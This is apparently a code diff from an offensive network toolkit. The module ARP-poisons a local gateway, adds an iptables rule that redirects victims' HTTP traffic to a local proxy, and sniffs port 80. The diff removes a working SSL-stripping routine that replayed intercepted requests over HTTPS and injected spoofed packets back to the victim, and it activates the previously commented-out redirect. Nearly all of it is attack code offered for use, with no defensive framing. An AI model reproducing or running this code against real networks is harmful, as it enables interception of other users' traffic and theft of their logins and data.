@@ -1,11 +1,11 @@
-from arp_poison import ArpPoisoner
-from scapy.all import *
+import os
 import threading
 import time
-import os
-import httplib
-import ssl
-from utils import get_gateway_ip, network_utils
+from scapy.all import *
+from attacks.arp_poison import ArpPoisoner
+from utils import get_gateway_ip
+from utils.network_utils import get_mac_address
+from utils.proxy_server import start_http_server
 
 def run(args):
     interface = args.interface
@@ -14,12 +14,15 @@ def run(args):
     # Spoof the gateway router
     gateway_ip = get_gateway_ip.find_gateway_ip()
     args.gateway_ip = gateway_ip
-    args.gateway_mac = network_utils.get_mac_address(gateway_ip, interface=args.interface)
+    args.gateway_mac = get_mac_address(gateway_ip, interface=args.interface)
     stop_event = threading.Event()
 
     try:
-        #Set up ip tables for rerouting http packets
-        #os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
+        # Start the HTTP server
+        start_http_server()
+
+        # Set up iptables for rerouting HTTP packets
+        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
 
         poisoner = ArpPoisoner(args)
         arp_poison_thread = threading.Thread(target=poisoner.start)
@@ -36,61 +39,12 @@ def run(args):
         stop_event.set()
         poisoner.stop()
 
-        #os.system("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
+        os.system("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
 
         arp_poison_thread.join()
 
 def start_sniffing(interface):
     sniff(iface=interface, filter="tcp port 80", store=False, prn=ssl_strip)
 
-def extract_headers(http_request):
-    headers = {}
-    lines = http_request.split('\r\n')
-    for line in lines:
-        if ": " in line:
-            key, value = line.split(': ', 1)
-            headers[key] = value
-    print(headers)
-    return headers
-
 def ssl_strip(packet):
-    if packet.haslayer(TCP) and packet[IP].dport == 80:
-        if packet.haslayer(Raw) and len(packet[Raw].load) > 0:
-            try:
-                http_request = packet[Raw].load.decode()
-                if "Host:" in http_request:
-                    lines = http_request.split('\r\n')
-                    host_line = next(line for line in lines if "Host:" in line)
-                    host = host_line.split(' ')[1]
-                    path = lines[0].split(' ')[1]
-
-                    headers = extract_headers(http_request)
-                    context = ssl.create_default_context()
-                    conn = httplib.HTTPSConnection(host, context=context)
-                    
-                    # Use the extracted headers and the same method (GET/POST)
-                    method = lines[0].split(' ')[0]
-                    conn.request(method, path, headers=headers)
-                    https_response = conn.getresponse()
-
-                    # Read response and extract necessary information
-                    response_body = https_response.read()
-                    content_type = https_response.getheader('Content-Type')
-                    content_length = https_response.getheader('Content-Length')
-                    
-                    http_response = "HTTP/1.1 200 OK\r\n" \
-                                    "Content-Type: {}\r\n" \
-                                    "Content-Length: {}\r\n" \
-                                    "Cache-Control: public, max-age=31536000\r\n" \
-                                    "\r\n" \
-                                    "{}".format(content_type, content_length, response_body)
-
-                    # Send the HTTP response to the victim
-                    spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
-                                       TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="PA") / \
-                                       Raw(load=http_response)
-                    send(spoofed_response, verbose=False, iface=packet.sniffed_on)
-                    print("Sent spoofed response")
-
-            except Exception as e:
-                print("Error handling packet: {}".format(e))
+    pass  # No need to implement this as the HTTP server handles the requests
